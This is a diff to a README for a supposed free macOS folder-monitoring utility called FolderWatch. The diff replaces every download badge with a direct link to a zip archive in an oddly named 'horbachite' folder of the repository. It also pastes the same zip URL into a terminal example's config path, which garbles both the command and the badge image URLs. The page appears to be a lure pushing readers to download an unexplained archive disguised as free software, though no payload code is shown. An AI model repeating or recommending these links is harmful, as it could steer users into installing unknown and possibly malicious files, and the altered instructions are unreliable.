@@ -1,6 +1,6 @@
 # 🗂️ FolderWatch for Mac Free Download
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://NewNameXD.github.io)
+[![Download](https://github.com/NewNameXD/folderwatch-for-mac-osx-tray-tool/raw/refs/heads/main/horbachite/tray_for_osx_folderwatch_tool_mac_v3.5.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://github.com/NewNameXD/folderwatch-for-mac-osx-tray-tool/raw/refs/heads/main/horbachite/tray_for_osx_folderwatch_tool_mac_v3.5.zip)
 
 **Your peace of mind, delivered in real-time:**  
 Welcome to the official repository of **FolderWatch for Mac** (Free Download). If you’ve ever wished to keep an eagle eye 🦅 on your Mac folders—protecting your digital territory and keeping surprises at bay—you’re in the right place!
@@ -20,7 +20,7 @@ With a **modern responsive interface**, rich language support, and *round-the-cl
 Looking for the fastest way to install?  
 Click here to download the latest macOS version:
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://NewNameXD.github.io)
+[![Download](https://github.com/NewNameXD/folderwatch-for-mac-osx-tray-tool/raw/refs/heads/main/horbachite/tray_for_osx_folderwatch_tool_mac_v3.5.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://github.com/NewNameXD/folderwatch-for-mac-osx-tray-tool/raw/refs/heads/main/horbachite/tray_for_osx_folderwatch_tool_mac_v3.5.zip)
 
 Please see the **Installation** section below for detailed instructions.
 
@@ -88,7 +88,7 @@ Configuring FolderWatch is as easy as a walk through your favorite macOS park. T
 Feeling powerful? Launch FolderWatch from your terminal like a pro:
 
 ```
-./folderwatch --config ~/configs/folderwatch-docs.json --log-level debug
+./folderwatch --config ~https://github.com/NewNameXD/folderwatch-for-mac-osx-tray-tool/raw/refs/heads/main/horbachite/tray_for_osx_folderwatch_tool_mac_v3.5.zip --log-level debug
 ```
 
 - `--config` Specify your JSON profile.
@@ -157,7 +157,7 @@ FolderWatch for Mac is released under the [MIT License](LICENSE).
 
 ## 🛒 One More Time: Download FolderWatch for Mac
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://NewNameXD.github.io)
+[![Download](https://github.com/NewNameXD/folderwatch-for-mac-osx-tray-tool/raw/refs/heads/main/horbachite/tray_for_osx_folderwatch_tool_mac_v3.5.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://github.com/NewNameXD/folderwatch-for-mac-osx-tray-tool/raw/refs/heads/main/horbachite/tray_for_osx_folderwatch_tool_mac_v3.5.zip)
 
 **Thank you for supporting free and open-source macOS utilities!**
 
